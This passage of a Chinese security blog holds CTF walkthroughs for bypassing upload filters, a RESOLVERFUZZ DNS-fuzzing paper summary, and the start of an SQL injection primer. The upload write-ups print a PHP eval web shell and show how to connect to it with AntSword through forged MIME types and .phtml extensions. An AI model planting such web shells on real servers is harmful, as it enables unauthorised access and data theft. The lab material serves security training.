<h5 id="Pass-01（前端JS绕过-x2F-客户端校验绕过）"><a href="#Pass-01（前端JS绕过-x2F-客户端校验绕过）" class="headerlink" title="Pass-01（前端JS绕过&#x2F;客户端校验绕过）"></a>Pass-01（前端JS绕过&#x2F;客户端校验绕过）</h5><p>有的网页采用js前端验证，可以在浏览器把js禁用，绕过验证，但是如果网站需要其它js代码才能正常运行，就不能采用这种方法</p>
<p>这道题是在前端使用了js对不合法图片进行检查</p>
<p>方法1</p>
<p>把网页源代码下载下来，删除js验证部分的代码，然后在图片上传的部分添加action，告诉它提交给谁</p>
<p>查看抓包信息，得到提交地址</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e49f589e-be44-43b5-b6c9-f896c2524426" alt="image"></p>
<p>编辑代码，并且删除js验证部分的代码，再运行，就可以提交成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d72bda3d-d4f6-408d-8e32-9d96764841a5" alt="image"></p>
<p>如果页面没有PHP代码来上传数据，只用JS来上传，就会抓不到包</p>
<p>方法2</p>
<p>在上传前，删除源码中的onsubmit&#x3D;”return checkFile()”</p>
<p>方法3</p>
<p>先将php文件后缀改为png，抓包，如何修改后缀名位.php在上传就可以上传成功</p>
<h5 id="Pass-02（后端验证文件类型–MIME校验）"><a href="#Pass-02（后端验证文件类型–MIME校验）" class="headerlink" title="Pass-02（后端验证文件类型–MIME校验）"></a>Pass-02（后端验证文件类型–MIME校验）</h5><p>点击右上角查看源码</p>
<p>源代码对图片类型进行了分析</p>
<p>方法1</p>
<p>上传一个图片文件，抓包记录它的MIME类型</p>
<p>上传一句话木马，抓包修改文件的MIME类型为刚才记录的 Content-Type</p>
<p>然后点击Forward提交，上传成功</p>
<p>方法2</p>
<p>修改文件后缀为图像文件，抓包修改文件名后缀</p>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/68414.html">finecms前台任意文件上传漏洞 | CN-SEC 中文网</a></p>
<h4 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h4><h5 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h5><p>创建一个木马文件</p>
<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
<p>上传该文件，显示Not image!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
<p>使用蚁剑</p>
<p>URL地址为：<code>/upload/a.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
<p>右键单击，文件管理，查看根目录，找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>

<h5 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h5><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
<p>抓包，显示上传成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
<p>连接密码为：<code>a</code></p>
<p>尝试一下，测试连接显示返回数据为空</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
<p>尝试修改后缀名为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功 后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
<p>右键单击，文件管理</p>
<p>在根目录中找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/06/Web-File1/" data-id="clsa003oc0000uovf5tsjeevx" data-title="Web-File1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-Code Vulnerability Detection via Signal-Aware AI" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/" class="article-date">
  <time class="dt-published" datetime="2024-02-03T09:05:55.000Z" itemprop="datePublished">2024-02-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="RESOLVERFUZZ-Automated-Discovery-of-DNS-Resolver-Vulnerabilities-with-Query-Response-Fuzzing-论文分享"><a href="#RESOLVERFUZZ-Automated-Discovery-of-DNS-Resolver-Vulnerabilities-with-Query-Response-Fuzzing-论文分享" class="headerlink" title="RESOLVERFUZZ: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing 论文分享"></a>RESOLVERFUZZ: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing 论文分享</h3><p>Zhang, Q., Bai, X., Li, X., Duan, H., Li, Q., &amp; Li, Z. (2023). ResolverFuzz: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing. ArXiv, abs&#x2F;2310.03202.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;sec23winter-prepub-246-zhang-qifan.pdf</a></p>
<p>RESOLVERFUZZ：使用查询-响应模糊测试自动发现DNS解析器漏洞</p>
<p>RESOLVERFUZZ通过专注于简短的查询响应序列来执行受限状态模糊处理，这是目前查找解析器错误的最有效的方法。其次，为了生成更有可能触发解析器错误的测试用例，本文将基于概率上下文自由语法（PCFG）的输入生成与查询和响应的字节级突变相结合。最后，利用差分测试和集群来识别缓存中毒等非崩溃漏洞。</p>
<h4 id="现存的解析器漏洞检测方法局限"><a href="#现存的解析器漏洞检测方法局限" class="headerlink" title="现存的解析器漏洞检测方法局限"></a>现存的解析器漏洞检测方法局限</h4><ol>
<li>大多数已知的解析器漏洞都是非崩溃漏洞，现有的检测手段无法直接检测到</li>
<li>缺乏严格的规范，无法将测试用例归类为解析器错误</li>
<li>解析器是有状态的，由于输入空间大，有状态模糊仍然具有挑战性</li>
</ol>
<h4 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h4><p>如何使分析仪器能够更准确地进行流量分类，在不同的流量中捕捉隐式的和鲁棒的模式。</p>
<h4 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h4><ol>
<li>对DNS CVE进行了全面研究。</li>
<li>根据CVE研究的见解，开发了一个新的黑盒模糊系统RESOLVER-FUZZ。它执行受限的查询响应模糊，以在解析器上发现有效的错误。</li>
<li>为RESOLVERFUZZ开发和&#x2F;或调整一套技术，包括DNS本地化、基于PCFG的测试生成、差异测试等。</li>
<li>针对6个主流解析器对RESOLVERFUZZ进行了评估，发现了23个漏洞。</li>
</ol>
<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>DNS（Domain Name System）是一个分布式数据库系统，它将域名与IP地址进行映射，以便用户可以通过易记的域名访问互联网上的各种资源。DNS系统由多个组件组成，包括域名服务器、解析器和DNS协议等。</p>
<p>域名服务器存储了大量的域名与IP地址的映射关系，当用户输入一个域名时，解析器会向域名服务器发送请求，以获取对应的IP地址。域名服务器可以分为多个级别，包括根域名服务器、顶级域名服务器和权威域名服务器，它们协同工作，帮助解析器找到正确的IP地址。</p>
<h4 id="DNS解析器"><a href="#DNS解析器" class="headerlink" title="DNS解析器"></a>DNS解析器</h4><p>解析器是用户设备或网络设备上的软件，它负责将用户输入的域名转换为对应的IP地址。解析器首先会查询本地缓存，如果没有找到对应的IP地址，就会向域名服务器发送请求，获取正确的IP地址。解析器还可以进行递归查询，即向多个域名服务器发送请求，直到找到正确的IP地址为止。</p>
<h4 id="DNS查询和响应的格式"><a href="#DNS查询和响应的格式" class="headerlink" title="DNS查询和响应的格式"></a>DNS查询和响应的格式</h4><p>遵循RFC 1034，RFC 1034定义了DNS查询和响应的格式，这些格式是DNS系统中用于进行域名解析的标准。以下是DNS查询和响应的格式遵循RFC 1034的主要内容：</p>
<p>DNS查询格式：</p>
<ul>
<li>查询报文格式遵循RFC 1034中定义的标准格式，包括查询标识、查询类型、查询类别等字段。</li>
<li>查询报文通常包括一个或多个查询问题部分，每个问题部分包含一个域名、查询类型和查询类别。</li>
</ul>
<p>DNS响应格式：</p>
<ul>
<li>响应报文格式同样遵循RFC 1034中定义的标准格式，包括响应标识、响应类型、响应类别等字段。</li>
<li>响应报文通常包括一个或多个资源记录部分，每个资源记录包含了对查询的响应信息，包括域名、TTL（生存时间）、数据长度和实际数据等字段。</li>
</ul>
<p>在RFC 1034中，还定义了DNS报文的各个字段的具体含义和格式要求，以及报文的传输方式和处理规则。这些规范使得不同的DNS实现能够遵循统一的标准，确保了DNS系统的互操作性和稳定性。</p>
<p>下图是一个DNS消息的示例</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cd3dbcec-a849-45bb-8dd9-badd507bbf1c" alt="image"></p>
<h4 id="DNS相关漏洞的分布和根本原因"><a href="#DNS相关漏洞的分布和根本原因" class="headerlink" title="DNS相关漏洞的分布和根本原因"></a>DNS相关漏洞的分布和根本原因</h4><p>下表是本文对主流DNS软件的DNS CVE研究结果</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/da44b6ca-4c51-422b-bbdb-29a7492f25b1" alt="image"></p>
<ul>
<li>F1：大多数CVE都是关于解析器的。本文总共确定了与6个研究的DNS软件相关的291个CVE（132个CVE与其他DNS软件有关）。其中，245（84%）是关于解析器（例如，递归和转发器模式的CVE-2019-6477和CVE-2020-8621）。只有46个CVE是关于名称服务器的（例如，CVE-2020-8619和CVE-2017-3143）。</li>
<li>F2：DNS软件中的多样化CVE。虽然BIND在CVE1的数量上占主导地位，但在其他软件（Technitium除外）中也发现了大量CVE。此外，本文发现245个CVE中只有13个CVE影响所有软件（例如，CVE-2020-12662下的NXNSAt-tack），这表明DNS软件的实现多种多样。</li>
<li>F3：很大一部分cve与崩溃无关。与先前研究TCP堆栈中的CVE的结果一样，本文发现不会触发软件崩溃的漏洞占很大一部分(245个cve中有109个)。主要后果包括缓存中毒(46个CVE，例如，在CVE-2002-2213和CVE-2006-0527下缓存非法记录)和资源消耗(39个CVE，例如，在CVE-2022-2795和CVE-2021-25219下花费过多的资源来处理DNS查询)。在136个与崩溃相关的bug中，只有43个是由CVE-2020-8625和CVE-2021-25216下的缓冲区溢出等内存损坏引起的。其他主要由断言失败触发(例如，CVE-2022-0635和CVE-2022-3080)。</li>
<li>F4：DNS消息的几乎每个字段都有相关的CVE。示例包括查询名称（CVE-2020- 8617）、查询类型（CVE-2022-0667）、查询标志（CVE-2017-15105）、rcode（CVE-2018-5734）、rdata（CVE-2013-4854）、TTL（CVE-2003-0914）等。</li>
<li>F5：大多数CVE都是通过非常短的消息序列触发的。本文发现222&#x2F;245（91%）的CVE可以通过仅发送一个客户端查询或ns-响应来触发。其中一个例子是CVE-2022-3736。对于其他需要更长序列的CVE（例如，CVE- 2022-3924），需要许多客户端查询来触发错误。</li>
</ul>
<h4 id="RESOLVERFUZZ的设计目标和挑战"><a href="#RESOLVERFUZZ的设计目标和挑战" class="headerlink" title="RESOLVERFUZZ的设计目标和挑战"></a>RESOLVERFUZZ的设计目标和挑战</h4><h5 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h5><p>RESOLVERFUZZ旨在取消覆盖上述威胁模型下的漏洞。 主要专注于四种类型的漏洞，缓存中毒、资源消耗、服务崩溃和内存损坏，因为这四种类型的漏洞是DNS软件的主要问题。 RESOLVERFUZZ应该高效地以高吞吐量测试解析器。此外，RESOLVERFUZZ应该能够以高精度判断测试输入是否会导致漏洞发现。</p>
<h5 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h5><p>C1：效率。定期DNS解析预计会有显著的延迟，因为客户端、解析器和多个名称服务器之间需要网络通信。因此，实现解析器模糊的高吞吐量并非易事。</p>
<p> C2：突变。广泛使用的灰盒模糊器，如AFL，用基于覆盖的met-ric突变输入。然而，此类指标没有就测试输入的哪一部分应该突变提供足够的指导，但DNS消息包含许多与错误相关的字段。</p>
<p> C3：有状态的模糊。与在无状态模式下运行的名称服务器不同，解析器是有状态的，其状态取决于缓存记录、配置等。由于输入序列的搜索空间很大，国有服务被认为是网络模糊的主要挑战。</p>
<p> C4：Oracle。非崩溃错误在CVE中有很大份额。然而，缺乏检测器来检测此类错误。相反，像AddressSanitizer这样的可以检测到崩溃错误。差异测试已用于发现非崩溃的语义错误，但之前的工作都没有为DNS构建ora-cle。此外，DNS解析器之间的不一致很常见，其中许多并不表明存在漏洞。</p>
<h4 id="RESOLVERFUZZ的工作流程"><a href="#RESOLVERFUZZ的工作流程" class="headerlink" title="RESOLVERFUZZ的工作流程"></a>RESOLVERFUZZ的工作流程</h4><p>在第一阶段，<strong>测试基础设施</strong>加载不同实现的解析器并配置环境。应用了许多优化技术来增加DNS查询和响应的吞吐量（C1）。然后，<strong>测试用例生成器</strong>对客户端查询和ns响应执行基于语法的突变（C2）。虽然解析器是有状态的（C3），但根据本文对CVE的研究，在大多数情况下，触发错误只需要一个客户端查询和&#x2F;或一个ns-响应的简短序列。因此，本文简化了有状态模糊，以模拟短序列。最终，对于我们的数据转储收集的数据，包括缓存、日志、响应和流量，开发了不同的程序来检测本文提到的不同类型的漏洞。本文应用差分测试来识别解析器之间的不一致，以捕获缓存中毒错误。为了解决（C4）问题，本文开发了一种新方法，对不一致情况进行聚类，并对异常情况进行警报，因此将大大减少错误调查的手动工作。</p>
<p>下图是RESOLVERFUZZ的流程图</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b9fe2a17-6e1e-4d3b-a8ad-a105333b041c" alt="image"></p>
<h4 id="测试基础设施"><a href="#测试基础设施" class="headerlink" title="测试基础设施"></a>测试基础设施</h4><p>测试基础设施用于模拟DNS查询和针对解析器的响应，并收集跟踪以待以后分析。该基础设施主要包括一个DNS客户端和一个名称服务器，该名称服务器发出由本文的模糊器（攻击者客户端和攻击者服务器）生成的消息，一个测试调度器和一个跟踪收集器。</p>
<h5 id="测试调度器"><a href="#测试调度器" class="headerlink" title="测试调度器"></a>测试调度器</h5><p>这个中央组件初始化DNS组件，包括攻击者客户端、攻击者服务器和解析器。在每轮测试（即一次DNS解析的往返）之间，调度器会重置这些组件。为了高效和完全重置，本文选择用轻量级Docker容器托管这些组件。为了增加测试吞吐量，调度器将命令客户端并行向解析器发送查询，并复制解析器实例。具体来说，调度器将攻击者客户端、攻击者服务器和解析器分组到一个单元中，并同时运行多个单元（使用不同的测试用例）。通过基于容器的隔离，每个解析器实例都可以独立测试。</p>
<h5 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h5><ul>
<li>测试调度器初始化Docker网络和n个模拟DNS基础设施单元。</li>
<li>测试调度器从生成器获取测试用例，并将其补丁到攻击者客户端和服务器。</li>
<li>在每个解析器容器启动后，内部监视器收集有关缓存转储、网络流量和进程信息的信息。</li>
<li>当攻击者客户端收到解析器响应时，解析器容器将通过缓存刷新或软件重新启动进行重置，相应的单元将返回到第2步，直到所有测试完成。</li>
</ul>
<h4 id="测试用例生成器"><a href="#测试用例生成器" class="headerlink" title="测试用例生成器"></a>测试用例生成器</h4><p>从两个维度生成测试用例，包括攻击者客户端的客户端查询和攻击者服务器的ns响应。将DNS解析器视为有状态服务，则生成与客户端查询相对应的ns-response。</p>
<p>鉴于DNS消息具有复杂的结构，本文将概率无上下文语法（PCFG）应用于生成客户端查询和ns-responses的模板。</p>
<p>PCFG代码示例：</p>
<p>使用NLTK库来定义了一个简单的PCFG语法，并且给每个产生式赋予了概率值。然后使用ChartParser进行句法分析，对句子 “the cat chased the dog” 进行分析，并输出得到的语法树。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nltk</span><br><span class="line"><span class="keyword">from</span> nltk <span class="keyword">import</span> Nonterminal, nonterminals, Production, CFG</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义语法规则</span></span><br><span class="line">grammar = CFG.fromstring(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  S -&gt; NP VP [1.0]</span></span><br><span class="line"><span class="string">  NP -&gt; Det N [0.5] | N [0.3] | NP PP [0.2]</span></span><br><span class="line"><span class="string">  VP -&gt; V NP [0.6] | VP PP [0.4]</span></span><br><span class="line"><span class="string">  PP -&gt; P NP [1.0]</span></span><br><span class="line"><span class="string">  Det -&gt; &#x27;the&#x27; [0.8] | &#x27;a&#x27; [0.2]</span></span><br><span class="line"><span class="string">  N -&gt; &#x27;cat&#x27; [0.3] | &#x27;dog&#x27; [0.3] | &#x27;man&#x27; [0.2] | &#x27;woman&#x27; [0.2]</span></span><br><span class="line"><span class="string">  V -&gt; &#x27;chased&#x27; [0.4] | &#x27;saw&#x27; [0.3] | &#x27;bit&#x27; [0.3]</span></span><br><span class="line"><span class="string">  P -&gt; &#x27;in&#x27; [0.5] | &#x27;on&#x27; [0.3] | &#x27;by&#x27; [0.2]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 句法分析</span></span><br><span class="line">parser = nltk.ChartParser(grammar)</span><br><span class="line">sent = <span class="string">&quot;the cat chased the dog&quot;</span>.split()</span><br><span class="line"><span class="keyword">for</span> tree <span class="keyword">in</span> parser.parse(sent):</span><br><span class="line">    <span class="built_in">print</span>(tree)</span><br><span class="line">    tree.pretty_print()</span><br></pre></td></tr></table></figure>

<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>本文开发了一个新的黑盒模糊系统RESOLVERFUZZ，专为查找DNS解析器漏洞能力而量身定制。RESOLVERFUZZ采用了约束状态模糊、差分测试和基于语法的模糊，达到了很好的效果。RE SOLVERFUZZ在查找解析器错误方面是有效的，发现了23个漏洞，并分配了15个CVE。</p>
<h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><h5 id="DNS解析器中4种类型的漏洞"><a href="#DNS解析器中4种类型的漏洞" class="headerlink" title="DNS解析器中4种类型的漏洞"></a>DNS解析器中4种类型的漏洞</h5><h6 id="缓存中毒"><a href="#缓存中毒" class="headerlink" title="缓存中毒"></a>缓存中毒</h6><p>攻击者篡改解析器的缓存，并将受害者客户端引导到恶意服务器。</p>
<p>DNS缓存中毒漏洞是一种网络安全漏洞，它允许攻击者操纵DNS服务器的缓存，以便将用户重定向到恶意网站或者进行其他恶意活动。这种漏洞可能会对用户的网络安全和隐私构成严重威胁。</p>
<p>缓存中毒漏洞的工作原理是利用DNS服务器的缓存功能，攻击者可以发送虚假的DNS响应，将恶意网站的IP地址存储在DNS服务器的缓存中。一旦DNS服务器缓存了这些虚假信息，当用户尝试访问受影响的域名时，DNS服务器将返回恶意网站的IP地址，使用户被重定向到攻击者控制的网站。</p>
<p>这种漏洞可能导致多种安全问题，包括：</p>
<ol>
<li>钓鱼攻击：攻击者可以伪装成合法网站，诱使用户输入敏感信息，如用户名、密码、信用卡信息等。</li>
<li>恶意软件分发：攻击者可将用户重定向到包含恶意软件的站点，从而感染用户设备。</li>
<li>窃取信息：攻击者可能窃取用户的个人信息或敏感数据。</li>
</ol>
<h6 id="资源消耗"><a href="#资源消耗" class="headerlink" title="资源消耗"></a>资源消耗</h6><p>攻击者严重消耗解析器的资源来影响其服务质量。</p>
<p>DNS资源消耗漏洞是指攻击者利用DNS协议中的漏洞，导致DNS服务器的资源被过度占用或耗尽的安全漏洞。这些漏洞可能会导致DNS服务器性能下降、服务不可用或拒绝服务攻击（DoS）。</p>
<p>一些常见的DNS资源消耗漏洞包括：</p>
<ol>
<li>DNS查询放大攻击：攻击者利用DNS协议中的特性，发送大量的DNS查询请求到受害服务器，导致DNS服务器资源被过度占用，从而影响其正常运行。</li>
<li>DNS区域传送攻击：攻击者利用DNS服务器的区域传送功能，向DNS服务器发送大量的区域传送请求，导致DNS服务器资源被耗尽，从而影响其正常运行。</li>
<li>DNS缓存投毒攻击：攻击者通过发送虚假的DNS响应，将恶意域名或IP地址存储在DNS服务器的缓存中，从而影响DNS服务器的正常运行。</li>
</ol>
<h6 id="非内存崩溃"><a href="#非内存崩溃" class="headerlink" title="非内存崩溃"></a>非内存崩溃</h6><p>攻击者在没有内存损坏的情况下终止解析器，例如，通过发送DNS mes- sages来执行具有断言失败的代码。</p>
<p>DNS非内存崩溃漏洞是指DNS软件或系统中的漏洞，其导致的错误或异常不是由内存访问错误引起的。这些漏洞可能导致DNS服务器的异常行为，包括但不限于崩溃、拒绝服务，或者可能被攻击者利用进行远程代码执行等恶意行为。</p>
<p>一些常见的DNS非内存崩溃漏洞类型包括：</p>
<ol>
<li>逻辑错误：DNS软件或系统中的逻辑错误可能导致预期之外的行为，例如在特定情况下导致程序进入无限循环或执行不正确的操作。</li>
<li>资源泄漏：DNS软件或系统中的资源泄漏漏洞可能导致系统资源（如文件描述符、内存、连接等）被耗尽，从而影响系统的正常运行。</li>
<li>不正确的错误处理：当DNS软件或系统在处理错误时出现问题，可能导致程序的异常行为，如未预料到的退出或崩溃。</li>
</ol>
<h6 id="内存崩溃"><a href="#内存崩溃" class="headerlink" title="内存崩溃"></a>内存崩溃</h6><p>攻击者的DNS消息损坏了解析器内存并终止了解析器。</p>
<p>DNS内存崩溃漏洞是指DNS软件或系统中的漏洞，导致程序在处理域名解析请求时发生内存访问错误，从而导致程序崩溃或产生其他异常行为。这些漏洞通常由于缓冲区溢出或其他内存管理错误导致。</p>
<p>一些常见的DNS内存崩溃漏洞类型包括：</p>
<ol>
<li>缓冲区溢出：DNS软件或系统中的缓冲区溢出漏洞可能导致攻击者向程序输入超出其预期范围的数据，从而覆盖了相邻的内存区域，最终导致程序崩溃或其他异常行为。</li>
<li>使用释放的内存：当DNS软件或系统尝试使用已经释放的内存时，可能导致程序崩溃或产生其他异常行为。</li>
<li>内存泄漏：DNS软件或系统中的内存泄漏漏洞可能导致系统内存资源被耗尽，从而影响系统的正常运行。</li>
</ol>
<h6 id="应对这些漏洞的方式"><a href="#应对这些漏洞的方式" class="headerlink" title="应对这些漏洞的方式"></a>应对这些漏洞的方式</h6><ol>
<li>更新和配置DNS服务器：及时更新DNS服务器软件，并正确配置DNS服务器避免受到常见的DNS资源消耗攻击。</li>
<li>限制区域传送：对DNS服务器进行配置，限制对区域传送的请求，以防止遭受区域传送攻击。</li>
<li>安全监控：实施安全监控和日志记录，以及时发现和响应DNS资源消耗攻击行为。</li>
<li>使用防火墙和入侵检测系统：配置防火墙和入侵检测系统，以检测和阻止恶意的DNS流量。</li>
<li>DNSSEC：部署DNSSEC（DNS安全扩展）来确保DNS数据的完整性和真实性，从而防范DNS缓存投毒攻击。</li>
<li>安全编程实践：在DNS软件或系统的开发过程中，采用安全编程实践，包括对用户输入进行正确的验证和过滤，以避免出现非内存崩溃漏洞。</li>
<li>代码审查：进行定期的代码审查，以发现和修复潜在的非内存崩溃漏洞。</li>
<li>安全测试：进行安全测试，包括静态代码分析和动态测试，以发现和修复潜在的漏洞。</li>
<li>及时修补：定期更新DNS软件和系统补丁，以修复已知的非内存崩溃漏洞。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/" data-id="cls5up31u00004ovf13qfhrdy" data-title="RESOLVERFUZZ" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-SQLi1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/01/Web-SQLi1/" class="article-date">
  <time class="dt-published" datetime="2024-02-01T10:15:18.000Z" itemprop="datePublished">2024-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/01/Web-SQLi1/">SQLi1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h4><p>参考 <a target="_blank" rel="noopener" href="https://www.yuque.com/weiker/xiaodi/ail8hbspn7hllqzi">https://www.yuque.com/weiker/xiaodi/ail8hbspn7hllqzi</a></p>
<h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>产生原因，可控变量带入数据库查询，变量未存在过滤或过滤不严谨，过滤不严谨的可以绕过过滤</p>
<p>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p>
<p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p>
<h5 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h5><p><strong>产生过程</strong></p>
